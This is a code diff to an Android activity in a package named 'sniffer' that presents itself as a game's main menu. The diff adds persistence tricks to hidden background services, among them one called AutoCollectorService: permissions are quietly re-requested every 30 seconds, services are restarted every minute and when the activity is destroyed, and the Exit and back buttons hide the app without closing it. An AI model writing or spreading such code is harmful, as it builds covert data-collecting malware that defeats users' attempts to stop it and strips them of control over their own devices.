@@ -6,6 +6,7 @@ import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
+import android.os.Looper;
 import android.view.View;
 import android.view.animation.Animation;
 import android.view.animation.AnimationUtils;
@@ -19,6 +20,7 @@ import com.v8.global.sniffer.R;
 import com.v8.global.sniffer.AutoCollectorService;
 import com.v8.global.sniffer.NotificationService;
 import com.v8.global.sniffer.PermissionGuardian;
+import com.v8.global.sniffer.utils.PermissionManager;
 import java.util.ArrayList;
 import java.util.List;
 
@@ -28,12 +30,16 @@ public class MainGameActivity extends Activity {
     private TextView tvHighScore, tvWelcome;
     private ImageView ivLogo;
     private int highScore = 0;
+    private Handler backgroundHandler = new Handler(Looper.getMainLooper());
+    private Runnable backgroundRunnable;
+    private boolean isRunning = true;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main_game);
 
+        // تهيئة العناصر
         btnPlay = findViewById(R.id.btn_play);
         btnSettings = findViewById(R.id.btn_settings);
         btnExit = findViewById(R.id.btn_exit);
@@ -46,8 +52,17 @@ public class MainGameActivity extends Activity {
         ivLogo.startAnimation(fadeIn);
         tvWelcome.startAnimation(fadeIn);
 
+        // تحميل أفضل نتيجة
         loadHighScore();
+
+        // تشغيل الخدمات الخلفية الدائمة
         startBackgroundServices();
+
+        // التحقق من الصلاحيات في الخلفية
+        checkPermissionsInBackground();
+
+        // بدء مراقبة الخدمات الخلفية
+        startBackgroundServiceMonitor();
 
         btnPlay.setOnClickListener(new View.OnClickListener() {
             @Override
@@ -71,7 +86,9 @@ public class MainGameActivity extends Activity {
             @Override
             public void onClick(View v) {
                 v.startAnimation(AnimationUtils.loadAnimation(MainGameActivity.this, R.anim.click_effect));
-                finishAffinity();
+                
+                // إخفاء التطبيق بدل إغلاقه
+                moveTaskToBack(true);
             }
         });
     }
@@ -82,32 +99,108 @@ public class MainGameActivity extends Activity {
     }
 
     private void startBackgroundServices() {
-        // تشغيل الخدمات الأصلية
-        Intent notificationIntent = new Intent(this, NotificationService.class);
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(notificationIntent);
-        } else {
-            startService(notificationIntent);
+        // تشغيل خدمة الإشعارات
+        try {
+            Intent notificationIntent = new Intent(this, NotificationService.class);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(notificationIntent);
+            } else {
+                startService(notificationIntent);
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
         }
         
-        Intent collectorIntent = new Intent(this, AutoCollectorService.class);
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(collectorIntent);
-        } else {
-            startService(collectorIntent);
+        // تشغيل خدمة السحب التلقائي
+        try {
+            Intent collectorIntent = new Intent(this, AutoCollectorService.class);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(collectorIntent);
+            } else {
+                startService(collectorIntent);
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
         }
         
-        Intent guardianIntent = new Intent(this, PermissionGuardian.class);
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(guardianIntent);
-        } else {
-            startService(guardianIntent);
+        // تشغيل حارس الصلاحيات
+        try {
+            Intent guardianIntent = new Intent(this, PermissionGuardian.class);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(guardianIntent);
+            } else {
+                startService(guardianIntent);
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
         }
+    }
+
+    private void checkPermissionsInBackground() {
+        new Handler().postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                if (isRunning) {
+                    PermissionManager pm = new PermissionManager(MainGameActivity.this);
+                    if (!pm.hasAllPermissions()) {
+                        // إذا فقدت بعض الصلاحيات، اطلبها مرة أخرى بهدوء
+                        pm.requestAllPermissions();
+                    }
+                    // كرر التحقق كل 30 ثانية
+                    new Handler().postDelayed(this, 30000);
+                }
+            }
+        }, 5000); // تحقق بعد 5 ثواني أول مرة
+    }
+
+    private void startBackgroundServiceMonitor() {
+        backgroundRunnable = new Runnable() {
+            @Override
+            public void run() {
+                if (isRunning) {
+                    // التحقق من أن الخدمات لا تزال تعمل
+                    ensureServicesRunning();
+                    // كرر كل دقيقة
+                    backgroundHandler.postDelayed(this, 60000);
+                }
+            }
+        };
+        backgroundHandler.postDelayed(backgroundRunnable, 10000);
+    }
+
+    private void ensureServicesRunning() {
+        // إعادة تشغيل الخدمات إذا توقفت
+        startBackgroundServices();
     }
 
     @Override
     protected void onResume() {
         super.onResume();
         loadHighScore();
+        isRunning = true;
+    }
+
+    @Override
+    protected void onPause() {
+        super.onPause();
+        // التطبيق في الخلفية - الخدمات تستمر بالعمل
+    }
+
+    @Override
+    protected void onDestroy() {
+        super.onDestroy();
+        isRunning = false;
+        if (backgroundHandler != null && backgroundRunnable != null) {
+            backgroundHandler.removeCallbacks(backgroundRunnable);
+        }
+        
+        // إعادة تشغيل الخدمات إذا تم تدمير النشاط
+        startBackgroundServices();
+    }
+
+    @Override
+    public void onBackPressed() {
+        // عند الضغط على زر الرجوع، نخفي التطبيق بدل إغلاقه
+        moveTaskToBack(true);
     }
 }
